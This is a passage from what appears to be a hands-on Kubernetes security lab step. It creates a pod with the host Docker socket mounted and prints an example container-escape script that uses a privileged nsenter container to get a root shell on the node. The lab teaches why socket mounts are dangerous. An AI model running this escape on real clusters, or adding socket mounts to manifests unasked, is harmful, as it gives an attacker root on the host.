## Step 4: Test Docker socket mount

```bash
# Mount Docker socket (extreme danger!)
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: docker-socket-pod
spec:
  containers:
  - name: app
    image: docker:latest
    command: ['sleep', '3600']
    volumeMounts:
    - name: docker-sock
      mountPath: /var/run/docker.sock
  volumes:
  - name: docker-sock
    hostPath:
      path: /var/run/docker.sock
      type: Socket
EOF

kubectl wait --for=condition=Ready pod docker-socket-pod --timeout=60s 2>/dev/null || echo "Docker socket may not be available"

# If Docker is available
echo "With Docker socket access:"
echo "- Can list all containers on node"
echo "- Can execute in any container"
echo "- Can create privileged containers"
echo "- Equivalent to root on host"

# Example attack (don't execute)
cat > /tmp/docker-escape-example.sh << 'EOF'
# From inside container with Docker socket:

# 1. List containers
docker ps

# 2. Create privileged container
docker run -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh

# 3. Now have root shell on host
# 4. Can access everything
EOF

cat /tmp/docker-escape-example.sh
```{{exec}}

Mounting the Docker socket gives full control over the container runtime - equivalent to root on the host.
